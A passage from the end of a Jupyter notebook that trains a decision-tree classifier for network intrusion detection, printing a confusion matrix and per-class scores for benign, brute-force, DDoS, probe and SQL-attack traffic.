     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 800x600 with 2 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "      benign       0.94      0.93      0.94       366\n",
      "  bruteforce       0.93      0.93      0.93       458\n",
      "        ddos       1.00      0.99      1.00       563\n",
      "       probe       0.99      0.99      0.99      3208\n",
      "   sqlattack       0.26      0.38      0.31        16\n",
      "\n",
      "    accuracy                           0.98      4611\n",
      "   macro avg       0.82      0.85      0.83      4611\n",
      "weighted avg       0.98      0.98      0.98      4611\n",
      "\n"
     ]
    }
   ],
   "source": [
    "cart = DecisionTreeClassifier()         # Create Decision Tree classifer object\n",
    "cart.fit(X_train_set, Y_train_set)      # Train Decision Tree Classifer\n",
    "cart_predictions = cart.predict(X_test) # Predict the response for test dataset\n",
    "print(\"CART accuracy test: \" + str(accuracy_score(Y_test, cart_predictions)))\n",
    "\n",
    "\n",
    "# print(str(confusion_matrix(Y_test, predictions_rfc)) + \"\\n\")\n",
    "import seaborn as sns\n",
    "cm = confusion_matrix(Y_test, cart_predictions)\n",
    "plt.figure(figsize=(8, 6))\n",
    "sns.heatmap(cm, annot=True, fmt=\"d\", cmap=\"Blues\", xticklabels=[\"benign\", \"bruteforce\", \"ddos\", \"probe\", \"sqlattack\"], yticklabels=[\"benign\", \"bruteforce\", \"ddos\", \"probe\", \"sqlattack\"])\n",
    "plt.xlabel(\"Predicted\")\n",
    "plt.ylabel(\"True\")\n",
    "\n",
    "plt.title(\"Confusion Matrix\")\n",
    "plt.show()\n",
    "\n",
    "\n",
    "print(classification_report(Y_test, cart_predictions))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Another training set to test to compare model\n",
    "# #########################################\n",
    "# newcart = DecisionTreeClassifier()\n",
    "# newcart.fit(X_train_set, Y_train_set)\n",
    "# newcart_predictions = newcart.predict(X_validation)\n",
    "# print(\"\\nCART accuracy validation based on 'test_size%': \" + str(accuracy_score(Y_validation, newcart_predictions)))\n",
    "\n",
    "# # print(str(confusion_matrix(Y_validation, newpredictions_rfc)) + \"\\n\")\n",
    "# cm = confusion_matrix(Y_validation, newcart_predictions)\n",
    "# plt.figure(figsize=(8, 6))\n",
    "# sns.heatmap(cm, annot=True, fmt=\"d\", cmap=\"Blues\", xticklabels=[\"benign\", \"bruteforce\", \"ddos\", \"probe\", \"sqlattack\"], yticklabels=[\"benign\", \"bruteforce\", \"ddos\", \"probe\", \"sqlattack\"])\n",
    "# plt.xlabel(\"Predicted\")\n",
    "# plt.ylabel(\"True\")\n",
    "# plt.title(\"Confusion Matrix\")\n",
    "# plt.show()\n",
    "\n",
    "# print(classification_report(Y_validation, newcart_predictions))\n",
    "# # df = dataset.reset_index(drop = False)\n",
    "# #########################################"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
